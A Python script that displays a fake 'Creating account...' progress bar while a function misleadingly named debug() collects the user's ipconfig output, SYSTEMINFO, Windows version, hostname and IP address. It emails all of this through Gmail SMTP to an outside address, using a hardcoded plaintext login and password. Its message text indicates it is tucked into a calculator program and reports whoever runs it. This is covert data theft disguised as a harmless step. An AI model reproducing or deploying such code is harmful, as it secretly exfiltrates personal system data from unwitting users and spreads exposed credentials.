import smtplib
import subprocess
import os
from time import sleep
import sys
from rich.progress import Progress

def debug():
    
    
    systemipfull = subprocess.check_output("ipconfig", shell=True, universal_newlines=True)
    progress.update(task, advance=18.75)
    #Boot script           
    pathname = os.path.dirname(sys.argv[0])
    progress.update(task, advance=18.75)
    sleep(1)
    systeminfo = subprocess.check_output("SYSTEMINFO", shell=True, universal_newlines=True)
    progress.update(task, advance=18.75)
    progress.update(task, advance=18.75)
    progress.update(task, advance=18.75)
    sleep(1)
    systemversion = subprocess.check_output("ver", shell=True, universal_newlines=True)
    sleep(1)
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import socket
    
    
    msg = MIMEMultipart()
    progress.update(task, advance=18.75)
    
    progress.update(task, advance=18.75)
    
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    progress.update(task, advance=18.75)
    server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d")
    progress.update(task, advance=18.75)
    server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone is using your script and it has crashed :( Not to worry! I have some info for you! :D "
                    "Here is their System info and full IP info for debug!" + " " + str(systemversion) + " " + 
                    str(systeminfo) + " " + str(systemipfull))
    
    progress.update(task, advance=18.75)

    server.quit()
    
    progress.update(task, advance=18.75)
    
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import socket
    progress.update(task, advance=18.75)

    h_name = socket.gethostname()
    
    progress.update(task, advance=18.75)
    
    addresssetup = socket.gethostbyname(h_name)
    
    progress.update(task, advance=18.75)
    msg = MIMEMultipart()
    
    progress.update(task, advance=18.75)
    
    server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
    server.login("python250200@gmail.com", "TgmpeJ68AUG.5.d",)
    server.sendmail("python250200@gmail.com", "peytonanthony99@gmail.com", "Attention Dev! Someone used calculator V2 "
                    "Here is their host name, IP, and Name!" + " " + str(h_name) + " " + str(addresssetup))
    server.quit()
    progress.update(task, advance=18.75)




with Progress() as progress:
    task = progress.add_task("Creating account...", total=300)
    debug()